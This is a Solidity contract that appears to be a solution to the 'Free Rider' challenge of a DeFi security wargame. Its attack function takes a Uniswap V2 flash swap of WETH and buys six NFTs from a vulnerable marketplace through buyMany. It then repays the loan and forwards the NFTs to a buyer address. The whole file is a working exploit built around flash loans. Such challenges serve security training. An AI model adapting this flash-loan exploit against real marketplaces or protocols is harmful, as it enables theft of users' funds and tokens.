// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "hardhat/console.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";

interface WETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address from) external returns (uint);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract FreeRiderChallenge is IERC721Receiver, IUniswapV2Callee{
    FreeRiderNFTMarketplace private _marketplace;
    IUniswapV2Pair private _uniswapPair;
    IERC721 private _nft;
    address private _buyer;

    constructor (
        address marketAddress,
        address uniswapPairAddress,
        address nftAddress,
        address buyer
    ) {
        _marketplace = FreeRiderNFTMarketplace(payable(marketAddress));
        _uniswapPair = IUniswapV2Pair(uniswapPairAddress);
        _nft = IERC721(nftAddress);
        _buyer = buyer;
    }

    function attack(uint _amount) external payable {
        address wethAddress = _uniswapPair.token0();
        bytes memory data = abi.encode(wethAddress, _amount);
        _uniswapPair.swap(_amount, 0, address(this), data);
    }

    function uniswapV2Call(
        address, 
        uint, 
        uint, 
        bytes calldata _data
    ) external override {
        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));

        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;

        console.log("Amount: ", amount);
        console.log("Amount to Repay: ", amountToRepay);

        uint[] memory tokenIds = new uint[](6);
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        console.log("WETH balance: ", WETH(tokenBorrow).balanceOf(address(this)));
        WETH(tokenBorrow).withdraw(amount);

        _marketplace.buyMany{value: amount}(
            tokenIds
        );
        WETH(tokenBorrow).deposit{value: amount}();
        WETH(tokenBorrow).transfer(address(_uniswapPair), amountToRepay);
        for (uint i = 0; i < 6; i++) {
            _nft.safeTransferFrom(address(this), _buyer, i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        console.log("Got an NFT");
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}